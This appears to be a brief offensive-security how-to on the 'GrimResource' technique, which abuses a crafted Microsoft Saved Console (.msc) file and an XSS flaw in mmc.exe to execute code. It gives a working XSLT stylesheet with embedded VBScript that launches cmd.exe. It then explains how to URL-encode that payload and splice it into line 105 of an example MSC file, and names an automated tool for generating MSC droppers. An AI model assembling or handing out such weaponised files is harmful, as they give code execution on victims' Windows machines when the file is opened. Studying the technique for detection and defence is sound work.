A technique [discovered by Elastic](https://www.elastic.co/security-labs/grimresource), dubbed 'GrimResource', uses a specially crafted `.msc` (Microsoft Saved Console) file and an unpatched XSS flaw to trigger JavaScript code execution via the Microsoft Management Console (mmc.exe).  An example MSC can be found [here](https://gist.github.com/joe-desimone/2b0bbee382c9bdfcac53f2349a379fa4).  The weaponised portion is on [line 105](https://gist.github.com/joe-desimone/2b0bbee382c9bdfcac53f2349a379fa4/961d997c169e4315c2eb0cc6a1af795dd685c550#file-grimresource-msc-L105), which is VBScript wrapped in a stylesheet, then URL-encoded.

We could utilise a similar looking payload to spawn cmd.exe:
```xml
<?xml version='1.0'?>
<stylesheet
    xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
    xmlns:user="placeholder"
    version="1.0">
    <output method="text"/>
    <ms:script implements-prefix="user" language="VBScript">
    <![CDATA[
        Set wshshell = CreateObject("WScript.Shell")
        wshshell.run "C:\\Windows\\System32\\cmd.exe"
]]></ms:script>
</stylesheet>
```

URL encode the payload using a tool like [CyberChef](https://gchq.github.io/CyberChef/#recipe=URL_Encode\(false\)&input=PD94bWwgdmVyc2lvbj0nMS4wJz8%2BDQo8c3R5bGVzaGVldA0KICAgIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L1hTTC9UcmFuc2Zvcm0iIHhtbG5zOm1zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOnhzbHQiDQogICAgeG1sbnM6dXNlcj0icGxhY2Vob2xkZXIiDQogICAgdmVyc2lvbj0iMS4wIj4NCiAgICA8b3V0cHV0IG1ldGhvZD0idGV4dCIvPg0KICAgIDxtczpzY3JpcHQgaW1wbGVtZW50cy1wcmVmaXg9InVzZXIiIGxhbmd1YWdlPSJWQlNjcmlwdCI%2BDQogICAgPCFbQ0RBVEFbDQogICAgICAgIFNldCB3c2hzaGVsbCA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpDQogICAgICAgIHdzaHNoZWxsLnJ1biAiQzpcXFdpbmRvd3NcXFN5c3RlbTMyXFxjbWQuZXhlIg0KXV0%2BPC9tczpzY3JpcHQ%2BDQo8L3N0eWxlc2hlZXQ%2B&ieol=CRLF&oeol=CRLF), then paste the encoded string onto line 105.

```xml
xsl.loadXML(unescape("<ENCODED SCRIPT HERE>"))
```

There are also a few automated tools that can help generate basic MSC payloads, such as [MSC_Dropper](https://github.com/ZERODETECTION/MSC_Dropper).